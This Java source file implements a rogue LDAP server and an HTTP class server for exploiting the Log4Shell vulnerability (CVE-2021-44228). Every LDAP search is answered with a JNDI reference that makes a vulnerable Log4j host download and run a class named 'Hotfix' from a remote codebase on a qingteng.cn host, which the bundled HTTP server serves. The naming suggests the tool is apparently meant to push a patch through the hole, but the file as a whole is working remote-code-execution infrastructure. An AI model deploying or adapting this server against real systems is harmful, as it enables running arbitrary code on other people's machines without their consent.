import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class LDAPServer {

	private static final String LDAP_BASE = "dc=qingteng,dc=cn";

	static Logger logger = LogManager.getLogger(LDAPServer.class);

	public static void main ( String[] args ) {
		int port = 80;

		try {
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
			config.setListenerConfigs(new InMemoryListenerConfig(
					"listen",
					InetAddress.getByName("0.0.0.0"),
					port,
					ServerSocketFactory.getDefault(),
					SocketFactory.getDefault(),
					(SSLSocketFactory) SSLSocketFactory.getDefault()));

			config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL("http://cve-2021-44228.qingteng.cn:8080/#Hotfix")));
			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
			logger.info("LPAPServer listening on 0.0.0.0:" + port);
			ds.startListening();
			startHTTPServer();
		}
		catch ( Exception e ) {
			e.printStackTrace();
		}
	}


	private static void startHTTPServer(){
		try {
			HttpServer httpServer = HttpServer.create(new InetSocketAddress(8080), 0);
			httpServer.createContext("/Hotfix.class", new HttpHandler() {
				@Override
				public void handle(HttpExchange httpExchange) throws IOException {
					byte[] respContents = getContent("Hotfix.class");
					httpExchange.getResponseHeaders().add("Content-Type", "application/octet-stream");
					httpExchange.sendResponseHeaders(200, respContents.length);
					httpExchange.getResponseBody().write(respContents);
					httpExchange.close();
				}
			});
			httpServer.start();
			logger.info("HTTPServer listening on 0.0.0.0:8080");
		}catch (IOException e){

		}
	}

	public static byte[] getContent(String filePath) throws IOException {
		File file = new File(filePath);
		long fileSize = file.length();
		if (fileSize > Integer.MAX_VALUE) {
			logger.info("file too big...");
			return null;
		}
		FileInputStream fi = new FileInputStream(file);
		byte[] buffer = new byte[(int) fileSize];
		int offset = 0;
		int numRead = 0;
		while (offset < buffer.length
				&& (numRead = fi.read(buffer, offset, buffer.length - offset)) >= 0) {
			offset += numRead;
		}

		if (offset != buffer.length) {
			throw new IOException("Could not completely read file "
					+ file.getName());
		}
		fi.close();
		return buffer;
	}


	private static class OperationInterceptor extends InMemoryOperationInterceptor {
		private URL codebase;

		public OperationInterceptor ( URL cb ) {
			this.codebase = cb;
		}

		@Override
		public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
			String base = result.getRequest().getBaseDN();
			logger.info("processSearchResult");
			Entry e = new Entry(base);
			try {
				sendResult(result, base, e);
			}
			catch ( Exception e1 ) {
				e1.printStackTrace();
			}

		}

		protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
			e.addAttribute("javaClassName", "Hotfix");
			String cbstring = this.codebase.toString();
			int refPos = cbstring.indexOf('#');
			if ( refPos > 0 ) {
				cbstring = cbstring.substring(0, refPos);
			}
			e.addAttribute("javaCodeBase", cbstring);
			e.addAttribute("objectClass", "javaNamingReference");
			e.addAttribute("javaFactory", this.codebase.getRef());
			result.sendSearchEntry(e);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}

	}
}